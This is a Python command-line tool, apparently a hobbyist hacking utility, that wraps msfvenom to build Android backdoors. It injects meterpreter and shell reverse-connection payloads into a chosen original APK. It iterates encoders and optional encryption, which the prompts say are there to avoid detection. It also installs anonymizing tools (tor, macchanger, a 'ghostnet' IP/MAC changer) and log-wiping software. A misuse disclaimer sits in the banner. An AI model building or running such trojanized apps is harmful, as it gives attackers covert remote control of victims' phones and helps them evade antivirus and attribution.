import sys
import time
import os
import subprocess
import socket

import requests
from colorama import Fore

# note there is too many things pending in this software it will be updated soon


# <---menu--->
menu = """
         -------------------------------------------------------------------------------------                                                                                         
        ||                                        MENU                                       ||                                                                                        
        ||-----------------------------------------------------------------------------------||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [1] Android                    |       [7] Coming Soon                   ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [2] Windows                    |       [8] Coming Soon                   ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [3] Linux                      |       [9] Coming Soon                   ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [4] Mac OS                     |       [10] Others                       ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [5] Backdoors with msfvenom    |       [11] Help                         ||                                                                                        
        ||                                         |                                         ||                                                                                        
        ||          [6] Ghostnet                   |       [0] Exit                          ||                                                                                        
         ------------------------------------------------------------------------------------- 
"""

# <----logo---->
banner = """
|̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ ̅ |
| ███████╗░██████╗░████████╗███████╗░█████╗░███╗░░░███╗░██████╗ |
| ██╔════╝██╔════╝░╚══██╔══╝██╔════╝██╔══██╗████╗░████║██╔════╝ |
| █████╗░░██║░░██╗░░░░██║░░░█████╗░░███████║██╔████╔██║╚█████╗░ |
| ██╔══╝░░██║░░╚██╗░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║░╚═══██╗ |
| ██║░░░░░╚██████╔╝░░░██║░░░███████╗██║░░██║██║░╚═╝░██║██████╔╝ |
| ╚═╝░░░░░░╚═════╝░░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═════╝░ |
|_______________________________________________________________|
| im not responsible for any misuse of this software, Thanks ❤  |
|_______________________________________________________________|
note : Buy me a coffee https://paypal.me/furjack
"""

# <----starting with a clear empty screen----->
os.system('clear')


# <---Functions--->
def showIp():
    host_name = socket.gethostname()
    Ip_Adress = socket.gethostbyname(host_name)

    print("\n[+] IP: " + Ip_Adress)

    myip = requests.get('https://www.wikipedia.org').headers['X-Client-IP']

    print("\n[+] Public IP: " + myip)


def options():
    global ipf, portf, outputf, iteratef
    print('your ip is\n')
    showIp()
    ipf = input('\nEnter your ip for LHOST: ')
    portf = input('\nEnter your port for LPORT: ')
    outputf = input('\nEnter output name for the apk(dont forget to put .apk): ')
    iteratef = input('\nHow much time to increase the iteration of encoder from non detection: ')


def option_xp():
    global loc, ip, port, output, iterate
    print('your ip is')
    showIp()
    loc = input('\nEnter the location of apk: ')
    ip = input('\nEnter your ip for LHOST: ')
    port = input('\nEnter your port for LPORT: ')
    output = input('\nEnter output name for the apk(dont forget to put .apk): ')
    iterate = input('\nHow much time to increase the iteration of encoder from non detection: ')


def encryption():
    global enc
    os.system('clear')
    print(Fore.BLUE, banner)
    print('plz select encryption')
    print('\n\n1. aes256')
    print('\n2. base64')
    print('\n3. rc4')
    print('\n4. xor')

    lock = input('\n\nEnter the encryption (default=3): ')

    if lock == '1':
        enc = 'aes256'
    if lock == '2':
        enc = 'base64'
    if lock == '3':
        enc = 'rc4'
    if lock == '4':
        enc = 'xor'
    if lock == '':
        enc = 'rc4'


def encoders():
    global e
    os.system('clear')
    print(Fore.BLUE, banner)
    print('plz select encoders')
    print('\n\n1. cmd/brace')
    print('\n2. cmd/echo')
    print('\n3. cmd/generic_sh')
    print('\n4. cmd/ifs')
    print('\n5. cmd/perl')
    print('\n6. cmd/powershell_base64')
    print('\n7. cmd/printf_php_mq')
    print('\n8. generic/eicar')
    print('\n9. generic/none')
    print('\n10. mipsbe/byte_xori')
    print('\n11. mipsbe/longxor')
    print('\n12. mipsle/byte_xori')
    print('\n13. mipsle/longxor')
    print('\n14. php/base64')
    print('\n15. ppc/longxor')
    print('\n16. ppc/longxor_tag')
    print('\n17. ruby/base64')
    print('\n18. sparc/longxor_tag')
    print('\n19. x64/xor')
    print('\n20. x64/xor_context')
    print('\n21. x64/xor_dynamic')
    print('\n22. x64/zutto_dekiru')
    print('\n23. x86/add_sub')
    print('\n24. x86/alpha_mixed')
    print('\n25. x86/alpha_upper')
    print('\n26. x86/avoid_underscore_tolower')
    print('\n27. x86/avoid_utf8_tolower')
    print('\n28. x86/bloxor')
    print('\n29. x86/bmp_polyglot')
    print('\n30. x86/call4_dword_xor')
    print('\n31. x86/context_cpuid')
    print('\n32. x86/context_stat')
    print('\n33. x86/context_time')
    print('\n34. x86/countdown')
    print('\n35. x86/fnstenv_mov')
    print('\n36. x86/jmp_call_additive')
    print('\n37. x86/nonalpha')
    print('\n38. x86/nonupper')
    print('\n39. x86/opt_sub')
    print('\n40. x86/service')
    print('\n41. x86/shikata_ga_nai')
    print('\n42. x86/single_static_bit')
    print('\n43. x86/unicode_mixed')
    print('\n44. x86/unicode_upper')
    print('\n45. x86/xor_dynamic')

    encoder = input('\nselect encoder (default=41): ')
    # <----Reading the user input---->
    if encoder == '1':
        e = 'cmd/brace'
    if encoder == '2':
        e = 'cmd/echo'
    if encoder == '3':
        e = 'cmd/generic_sh'
    if encoder == '4':
        e = 'cmd/ifs'
    if encoder == '5':
        e = 'cmd/perl'
    if encoder == '6':
        e = 'cmd/powershell_base64'
    if encoder == '7':
        e = 'cmd/printf_php_mq'
    if encoder == '8':
        e = 'generic/eicar'
    if encoder == '9':
        e = 'generic/none'
    if encoder == '10':
        e = 'mipsbe/byte_xori'
    if encoder == '11':
        e = 'mipsbe/longxor'
    if encoder == '12':
        e = 'mipsle/byte_xori'
    if encoder == '13':
        e = 'mipsle/longxor'
    if encoder == '14':
        e = 'php/base64'
    if encoder == '15':
        e = 'ppc/longxor'
    if encoder == '16':
        e = 'ppc/longxor_tag'
    if encoder == '17':
        e = 'ruby/base64'
    if encoder == '18':
        e = 'sparc/longxor_tag'
    if encoder == '19':
        e = 'x64/xor'
    if encoder == '20':
        e = 'x64/xor_context'
    if encoder == '21':
        e = 'x64/xor_dynamic'
    if encoder == '22':
        e = 'x64/zutto_dekiru'
    if encoder == '23':
        e = 'x86/add_sub'
    if encoder == '24':
        e = 'x86/alpha_mixed'
    if encoder == '25':
        e = 'x86/alpha_upper'
    if encoder == '26':
        e = 'x86/avoid_underscore_tolower'
    if encoder == '27':
        e = 'x86/avoid_utf8_tolower'
    if encoder == '28':
        e = 'x86/bloxor'
    if encoder == '29':
        e = 'x86/bmp_polyglot'
    if encoder == '30':
        e = 'x86/call4_dword_xor'
    if encoder == '31':
        e = 'x86/context_cpuid'
    if encoder == '32':
        e = 'x86/context_stat'
    if encoder == '33':
        e = 'x86/context_time'
    if encoder == '34':
        e = 'x86/countdown'
    if encoder == '35':
        e = 'x86/fnstenv_mov'
    if encoder == '36':
        e = 'x86/jmp_call_additive'
    if encoder == '37':
        e = 'x86/nonalpha'
    if encoder == '38':
        e = 'x86/nonupper'
    if encoder == '39':
        e = 'x86/opt_sub'
    if encoder == '40':
        e = 'x86/service'
    if encoder == '41':
        e = 'x86/shikata_ga_nai'
    if encoder == '42':
        e = 'x86/single_static_bit'
    if encoder == '43':
        e = 'x86/unicode_mixed'
    if encoder == '44':
        e = 'x86/unicode_upper'
    if encoder == '45':
        e = 'x86/xor_dynamic'
    if encoder == '':
        e = 'x86/shikata_ga_nai'
    # else:
    #     print('invalid argument exiting')
    #     sys.exit()


def payloads():
    global pa
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. android/meterpreter_reverse_https')
    print('\n2. android/meterpreter/reverse_https')
    print('\n3. android/meterpreter_reverse_http')
    print('\n4. android/meterpreter/reverse_http')
    print('\n5. android/meterpreter_reverse_tcp')
    print('\n6. android/meterpreter/reverse_tcp')
    print('\n7. android/shell/reverse_https')
    print('\n8. android/shell/reverse_http')
    print('\n9. android/shell/reverse_tcp')

    payload = input('\n\n\nEnter (default=6):')
    # <----Reading the user input---->
    if payload == '1':
        pa = 'android/meterpreter_reverse_https'
    if payload == '2':
        pa = 'android/meterpreter/reverse_https'
    if payload == '3':
        pa = 'android/meterpreter_reverse_http'
    if payload == '4':
        pa = 'android/meterpreter/reverse_http'
    if payload == '5':
        pa = 'android/meterpreter_reverse_tcp'
    if payload == '6':
        pa = 'android/meterpreter/reverse_tcp'
    if payload == '7':
        pa = 'android/shell/reverse_https'
    if payload == '8':
        pa = 'android/shell/reverse_http'
    if payload == '9':
        pa = 'android/shell/reverse_tcp'
    if payload == '':
        pa = 'android/meterpreter/reverse_tcp'


def payloads_x_e():
    global p
    os.system('clear')
    print(Fore.BLUE, banner)
    print('select what type of payload u want')
    print('\n\n1. android/meterpreter/reverse_https')
    print('\n2. android/meterpreter/reverse_http')
    print('\n3. android/meterpreter/reverse_tcp')
    print('\n4. android/shell/reverse_https')
    print('\n5. android/shell/reverse_http')
    print('\n6. android/shell/reverse_tcp')

    payload = input('\n\n\nEnter (default=6):')
    # <----Reading the user input---->
    if payload == '1':
        p = 'android/meterpreter/reverse_https'
    if payload == '2':
        p = 'android/meterpreter/reverse_http'
    if payload == '3':
        p = 'android/meterpreter/reverse_tcp'
    if payload == '4':
        p = 'android/shell/reverse_https'
    if payload == '5':
        p = 'android/shell/reverse_http'
    if payload == '6':
        p = 'android/shell/reverse_tcp'
    if payload == '':
        p = 'android/meterpreter/reverse_tcp'


def msfvenom_x():
    os.system('clear')
    print(Fore.BLUE, banner)
    option_xp()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom -b --arch dalvik --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
        ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' -i ' + str(iterate) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(output))
    print(Fore.RED,
          '\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]')

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


def msfvenom_p():
    os.system('clear')
    print(Fore.BLUE, banner)
    options()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads()
    time.sleep(2)
    encoders()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom --arch dalvik --platform android -p ' + str(pa) + ' LHOST=' + str(ipf) + ' LPORT=' + str(
        portf) + ' --encoder ' + str(e) + ' -i ' + str(iteratef) + ' -o ' + str(os.getcwd()) + '/payload-apps/' + str(
        outputf))

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


def msfvenom_encrypt():
    os.system('clear')
    print(Fore.BLUE, banner)
    option_xp()
    print('\nokay lets select what type of payload you want! to create')
    time.sleep(4)
    payloads_x_e()
    time.sleep(2)
    encoders()
    time.sleep(2)
    encryption()
    time.sleep(2)
    os.system('clear')
    print('creating payload with the given information this will take some time, Plz be patient')

    os.system('msfvenom -b --arch dalvik --platform android -x ' + str(loc) + ' -p ' + str(p) + ' LHOST=' + str(
        ip) + ' LPORT=' + str(port) + ' --encoder ' + str(e) + ' --encrypt ' + str(enc) + ' -i ' + str(
        iterate) + ' -o ' + str(
        os.getcwd()) + '/payload-apps/' + str(output))
    print(Fore.RED,
          '\nignore this line if no error\n[if any error occurs above try changing the encoder and iteration or else try changing original apk]')

    print(Fore.BLUE, '\nsuccessfully created the payload its stored in payload-apps/ folder Thank you')


# <----functions of main menu---->
def Android():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload (main activity.apk)')
    print('\n3. encrypted backdoor payload')

    ist = input('\n\n\nEnter (default=0): ')

    if ist == "0":
        sys.exit()

    if ist == "1":
        msfvenom_x()
        print('your payload is successfully created and stored in ../payload-apps/')

    if ist == "2":
        msfvenom_p()
        print('your payload is successfully created and stored in ../payload-apps/')

    if ist == "3":
        msfvenom_encrypt()
        print('your payload is successfully created and stored in ../payload-apps/')

    else:
        sys.exit()


def Windows():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload')
    print('\n3. encrypted backdoor payload')


def Linux():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload')
    print('\n3. encrypted backdoor payload')
    
    input('\n\nEnter (default=2): ')


def Mac():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')
    print('\n1. backdoor in original apk')
    print('\n2. only payload (main activity.apk)')
    print('\n3. encrypted backdoor payload')


def Backdoors():
    os.system('clear')
    print(Fore.BLUE, banner)
    print('0. exit')


def Ghostnet():
    os.system('clear')  # for fully clear screen
    print(Fore.BLUE, banner)
    print('\n\nA special thanks for mach1el to create this tool ghostnet')
    print('\nGhostnet is tool to anonymize your ip and mac address it changes randomly every minutes')
    print('\n1. Start')
    print('\n2. Stop')
    print('\n3. Status')

    g = input('\n\nghostnet: ')

    if g == '1':
        os.system('ghostnet start')
    if g == '2':
        os.system('ghostnet stop')
    if g == '3':
        os.system('ghostnet status')
    if g == '':
        os.system('ghostnet')


def Help():
    ...


def coming_soon():
    os.system('clear')  # for fully clear screen
    print(Fore.BLUE, banner)
    print('\n\ncoming soon under development Thanks for using this tool')
    sys.exit()


def Others():
    ...


# <---main--->
def main():
    os.system('clear')  # for fully clear screen
    print(Fore.BLUE, banner)

    print(menu)

    me = input('\n\nSelect your option: ')

    if me == '1':
        Android()
    if me == '2':
        Windows()
    if me == '3':
        Linux()
    if me == '4':
        Mac()
    if me == '5':
        Backdoors()
    if me == '6':
        Ghostnet()
    if me == '7':
        coming_soon()
    if me == '8':
        coming_soon()
    if me == '9':
        coming_soon()
    if me == '10':
        Others()
    if me == '11':
        Help()
    if me == '0':
        sys.exit(0)
    else:
        sys.exit(0)


# <----Checking root---->
def check_root():
    if os.geteuid() != 0:
        exit("You need to have root privileges to create payload.\ntry again using sudo")


def check_os():
    os = subprocess.call(['which', 'pacman'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if os != 0:
        print('This distro or os is not supported this framework is only for arch! thanks')
        sys.exit(0)



def check_connection():
    try:
        # connect to the host -- tells us if the host is actually
        # reachable
        socket.create_connection(("1.1.1.1", 53))
        return True
    except OSError:
        print('Please connect to internet')
        print('without internet the tool wont work to install modules')
        sys.exit()


# <--all needed modules for payload creation-->
def installer():
    print(Fore.BLUE, banner)

    print("Checking for the needed modules")

    # nyx tor macchanger
    rc = subprocess.call(['which', 'tor'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('tor is installed ✔')
    else:
        print('tor and related tools are not installed \ninstalling')
        subprocess.call(['yes | pacman -S nyx macchanger tor gnu-netcat socat bleachbit'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # blackarch tools
    # ba = input('would you like to install all blackarch tools its almost 15gb (Y/n): ').lower()
    # if ba == 'y':
    #     print('This is under development')
    # else:
    #     pass

    # xterm
    rc = subprocess.call(['which', 'xterm'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('xterm is installed! ✔️')
    else:
        print('xterm is not installed \ninstalling')
        subprocess.call(['yes | pacman -S xterm'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # postgresql
    rc = subprocess.call(['which', 'psql'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('postgresql is intsalled')
    else:
        print('postgresql is not installed \ninstalling')
        subprocess.call(['yes | pacman -S postgresql'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
    # Apktool
    rc = subprocess.call(['which', 'apktool'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if rc == 0:
        print('apktool is installed! ✔️')
    else:
        print('apktool not installed \ninstalling')
        subprocess.call(['chmod +x ' + str(os.getcwd()) + '/apktool ' + str(os.getcwd()) + '/apktool.jar'], shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
        subprocess.call(['mv ' + str(os.getcwd()) + '/apktool ' + str(os.getcwd()) + '/apktool.jar /usr/bin/'],
                        shell=True,
                        stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)

    # Zipalign
    zp = subprocess.call(['which', 'zipalign'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if zp == 0:
        print('zipalign is installed! ✔️')
    else:
        print('zipalign is not installed! \ninstalling zipalign')
        subprocess.call(['yes | pacman -S android-sdk-build-tools'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # jarsigner
    jr = subprocess.call(['which', 'jarsigner'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if jr == 0:
        print("jarsigner is installed! ✔️")
    else:
        print('jarsigner is not installed ! \ninstalling jarsigner')
        subprocess.call(['yes | pacman -S jre-openjdk'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)

    # Msfvenom, metasploit
    ms = subprocess.call(['which', 'msfvenom'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if ms == 0:
        print('msfvenom is installed! ✔️')
    else:
        print('metasploit is not installed! \nInstalling Metasploit')
        subprocess.call(['yes | pacman -S metasploit'], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    # Java
    jdk = subprocess.call(['which', 'java'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if jdk == 0:
        print('open-jdk installed! ✔️')
    else:
        print('installing java')
        subprocess.call(['yes | pacman -S jdk-openjdk java-environment-common'], shell=True, stdout=subprocess.DEVNULL,
                        stderr=subprocess.STDOUT)
    # ghostnet
    gh = subprocess.call(['which', 'ghostnet'], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    if gh == 0:
        print('ghostnet is installed ✔️')
    else:
        print('ghostnet is not installed! \ninstalling')
        os.system('chmod +x ghostnet && mv ghostnet /usr/bin/ && mv ghostnet.log /opt/')

    print('everything setup perfectly ✔')
    time.sleep(2)


if __name__ == '__main__':
    try:
        check_os()
        check_root()
        check_connection()
        installer()
        main()
    except KeyboardInterrupt:
        print('\nExit signal received \nexiting ')
        sys.exit()
